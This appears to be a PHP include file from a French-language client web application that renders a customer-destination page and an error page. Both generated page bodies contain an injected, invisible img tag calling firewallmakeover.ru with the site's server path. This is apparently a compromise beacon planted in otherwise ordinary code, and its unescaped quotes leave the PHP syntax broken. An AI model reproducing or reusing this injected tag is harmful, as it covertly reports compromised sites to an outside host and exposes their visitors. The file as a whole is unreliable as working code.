<?php
/* Programme : client_dest.inc
*	Description : Affichage des destinataire d'un client
*	Auteur : Denis Léveillé 	 			  Date : 2007-10-24
*/
include('lib/config.php');

// **** Choix de la langue de travail ****
switch( $_SESSION['langue'] ) {
	case "en":	include("climessen.inc");
					include("./extra/varmessen.inc");
					break;
	case "sp":	include("climesssp.inc");
					include("./extra/varmesssp.inc");
					break;
	default:		include("climessfr.inc");
					include("./extra/varmessfr.inc");

} // switch SLangue

function MetMessErreur( $Erreur, $Message, $NoErr )
{
global $TabMessGen;
include("./extra/varcie.inc");
  echo "
      <html>
      <head>
      <title>$TabMessGen[80]</title>
      </head>
	  <SCRIPT language=JavaScript1.2 src='./extra/javafich/disablekeys.js'></SCRIPT>
      <body bgcolor='#E0E0FF'><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>
      <h2 align='center' style='margin-top: .7in'>
      $TabMessGen[22] $NoErr - $Erreur</h2>
      <div align='center'>
      <p style='margin-top: .5in'>
      <b>$TabMessGen[23] $Message</b>
      </div>
		<div align='center'><font size=-1>
		$TabMessGen[1]
		<a href='mailto:".hexentities($AdrWebmestre)."?subject=Page Web $NomCie'>
		$TabMessGen[2]</a>
		</font></div>
		<p align='center' valign='bottom'><font size=1>
		$TabMessGen[8]		 
		$TabMessGen[3]		 
		$NomCie
		$TabMessGen[4]		  
		</p>
		
      <script LANGUAGE='javascript'>
		 addKeyEvent();

	  </script>
	  <script language=JavaScript1.2 src='./extra/javafich/blokclick.js'></script>
      </body>
      </html>
  \n";
   exit();
}

$Dest = dest_client( $_SESSION[$_SERVER['SERVER_NAME']] );
if( isset( $Dest['NoClient'] ) ) {
	   extract($Dest);
		if( strlen($Telephone) )
		  list($TelCodR, $TelP1, $TelP2) = sscanf($Telephone,"(%3s)%3s-%4s");
 		include( "client_form.inc");
 		exit();
}
  echo "
      <html>
      <head>
       <title>$TabMessGen[82]</title>
      </head>
	  <SCRIPT language=JavaScript1.2 src='./extra/javafich/disablekeys.js'></SCRIPT>
	  <body bgcolor='#E0E0FF'><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>
	  <BASE TARGET=MAIN>
      <h2 align='center' style='margin-top: .7in'>
      $TabMessGen[50]</h2>
      <div align='center'>
      </div>
		<div align='center'><font size=-1>
		$TabMessGen[1]
		<a href='mailto:".hexentities($AdrWebmestre)."?subject=Page Web $NomCie'>
		$TabMessGen[2]</a>
		</font></div>
		<p align='center' valign='bottom'><font size=1>
		$TabMessGen[8]		 
		$TabMessGen[3]		 
		$NomCie
		$TabMessGen[4]		  
		</p>
  ";

?>
<script LANGUAGE="javascript">
		 addKeyEvent();

</script>
<script language='JavaScript1.2' src='./extra/javafich/blokclick.js'></script>
   </body>
</html>

